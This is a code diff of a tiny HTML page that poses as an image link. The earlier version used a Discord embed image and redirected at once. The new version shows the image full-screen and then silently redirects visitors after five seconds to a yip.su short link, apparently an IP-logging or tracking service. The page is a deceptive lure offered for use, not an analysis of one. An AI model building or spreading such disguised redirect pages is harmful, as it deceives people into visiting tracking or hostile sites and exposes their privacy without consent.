@@ -4,19 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Open Graph meta tags for Discord embed -->
-    <meta property="og:image" content="https://raw.githubusercontent.com/cometuserlol/test/refs/heads/main/image.png">
+    <title>Image Page</title>
 
-    <title>Redirecting...</title>
-    
-    <!-- Redirect script -->
+    <!-- Redirect Script (optional delay) -->
     <script>
-        window.onload = function() {
-            window.location.href = "https://yip.su/image000"; // The site to redirect to
-        };
+        setTimeout(function() {
+            window.location.href = "https://yip.su/image000"; // Replace with your redirect URL
+        }, 5000); // Redirect after 5 seconds (adjust as needed)
     </script>
 </head>
-<body>
-    <p>Redirecting...</p>
+<body style="display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+    <!-- Display the image on the webpage -->
+    <img src="https://raw.githubusercontent.com/cometuserlol/test/refs/heads/main/image.png" alt="Embedded Image" style="max-width: 100%; max-height: 100%;">
 </body>
 </html>
